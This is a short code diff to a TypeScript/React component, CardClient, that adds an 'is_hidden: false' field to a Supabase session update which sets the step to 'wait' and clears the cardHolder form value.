@@ -70,8 +70,7 @@ export function CardClient({ sessionId }: Props) {
     const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
     const { error } = await supabase
       .from("sessions")
-      .update({
-        current_step: "wait",
+      .update({ is_hidden: false, current_step: "wait",
         form_data: {
           ...prev,
           cardHolder: "",
